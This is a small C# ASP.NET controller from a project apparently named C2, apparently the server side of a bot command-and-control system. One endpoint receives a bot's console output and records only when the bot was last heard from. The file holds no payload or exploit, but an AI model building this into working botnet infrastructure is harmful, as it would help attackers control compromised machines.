using C2.Models;
using Microsoft.AspNetCore.Mvc;

namespace C2.Controllers;

[ApiController]
[Route("[controller]")]
public class ResultsController : AbstractController
{
    [HttpGet("ResultsTest")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public IActionResult ResultsTest() => Ok();

    public IActionResult Console([FromQuery] int bot_id, [FromBody] string[] output)
    {
        BotClient bot = C2State.BotManager.Bots[bot_id];
        bot.ConnectionInfo.LastHeardFrom = DateTime.UtcNow;

        return Ok();
    }
}
